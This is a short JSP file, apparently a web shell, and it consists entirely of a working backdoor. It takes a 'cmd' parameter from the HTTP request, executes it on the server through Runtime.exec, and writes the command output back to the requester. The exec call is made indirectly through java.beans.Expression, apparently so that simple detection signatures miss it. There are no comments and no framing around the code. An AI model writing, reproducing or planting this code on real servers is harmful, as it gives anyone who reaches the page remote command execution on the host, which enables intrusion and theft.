<%@ page import="java.beans.Expression" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%
  String cmd = request.getParameter("cmd");
  Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});

  Process process = (Process) expr.getValue();
  InputStream in = process.getInputStream();
  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
  String tmp = null;
  while((tmp = bufferedReader.readLine())!=null){
    response.getWriter().println(tmp);
  }
%>
